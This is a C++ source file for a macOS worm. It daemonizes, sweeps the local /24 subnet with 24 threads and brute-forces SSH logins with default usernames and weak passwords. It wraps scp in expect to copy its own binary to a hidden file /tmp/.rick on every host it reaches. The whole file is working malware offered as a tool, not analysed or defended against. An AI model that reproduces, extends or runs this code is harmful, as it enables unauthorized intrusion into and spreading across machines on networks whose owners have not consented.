// language: C++17, file: src/macos/06_lan_worm_mac.cpp, target: macOS, clang
// LAN worm macOS - sweep /24, drop via ssh+scp enveloppe par expect (creds faibles)
// Usage: 06_lan_worm [mot_de_passe]  (defaut: liste integree)
// Build: clang++ -O2 -std=c++17 -pthread
// Pre-requis cible: service SSH actif (Partage a distance)
#include <mach-o/dyld.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <atomic>
#include <vector>
#include <string>
#include <cstdlib>
#include <cstdio>

static std::atomic<int> g_next{1};
static std::atomic<int> g_hits{0};
static const char* g_customPass = nullptr;

static std::string SelfPath() {
    char buf[1024];
    uint32_t sz = sizeof(buf);
    _NSGetExecutablePath(buf, &sz);
    return buf;
}

static std::string LocalPrefix() {
    char host[256] = {0};
    if (gethostname(host, sizeof(host)) != 0) return "192.168.1.";
    addrinfo hints{}; hints.ai_family = AF_INET;
    addrinfo* res = nullptr;
    if (getaddrinfo(host, NULL, &hints, &res) != 0 || !res) return "192.168.1.";
    char ip[64] = {0};
    inet_ntop(AF_INET, &((sockaddr_in*)res->ai_addr)->sin_addr, ip, sizeof(ip));
    freeaddrinfo(res);
    int dots = 0; std::string out;
    for (const char* p = ip; *p; p++) {
        out += *p;
        if (*p == '.' && ++dots == 3) break;
    }
    return out;
}

static bool TryHost(const std::string& ip, const char* user, const char* pass) {
    // scp enveloppe par expect: auth mot de passe sans sshpass (absent en stock)
    std::string cmd =
        "/usr/bin/expect -c 'set timeout 5; log_user 0; "
        "spawn scp -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=no "
        + SelfPath() + " " + user + "@" + ip + ":/tmp/.rick ; "
        "expect { \"assword:\" { send \"" + std::string(pass) + "\\r\"; exp_continue } "
        "eof {} timeout { exit 1 } }'";
    return system(cmd.c_str()) == 0;
}

static void Worker() {
    std::string prefix = LocalPrefix();
    const char* users[]  = { "admin", "administrator", NULL };
    const char* passes[] = { "", "admin", "password", "1234", "toor", g_customPass, NULL };
    for (;;) {
        int i = g_next.fetch_add(1);
        if (i > 254) return;
        std::string ip = prefix + std::to_string(i);
        for (int u = 0; users[u]; u++)
            for (int p = 0; passes[p]; p++)
                if (TryHost(ip, users[u], passes[p])) {
                    g_hits++;
                    return;
                }
    }
}

int main(int argc, char** argv) {
    daemon(0, 0);
    if (argc > 1) g_customPass = argv[1];
    std::vector<std::thread> pool;
    for (int i = 0; i < 24; i++) pool.emplace_back(Worker);
    for (auto& t : pool) t.join();
    return g_hits.load();
}
